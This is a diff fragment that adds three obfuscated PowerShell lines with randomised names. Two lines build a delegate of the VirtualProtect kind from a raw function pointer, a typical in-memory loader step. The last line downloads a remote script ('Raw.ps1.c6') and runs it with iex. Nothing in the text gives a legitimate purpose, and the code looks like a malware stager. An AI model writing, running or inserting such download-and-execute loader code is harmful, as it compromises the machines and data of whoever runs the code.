@@ -1,0 +1,3 @@
+$XUEoMovZebQPwEGqTlFUuPb = Get-DelegateType -RWcBuwdccNtSUYMyOWboZYjCOHzYSMHEAKU @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) -xsOBckBWhViwObCpAeXPvsaepGt ([Bool])
+$qHuYGzrAkQUeUiCJYvvRWxVpmguSXJnQGjGaol=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LszgEwbNXaSkQBSdmOcwyhCaDTdvpvBLxNQ, $XUEoMovZebQPwEGqTlFUuPb)
+$wbc.DownloadString("$prefixpath/Raw.ps1.c6") | iex
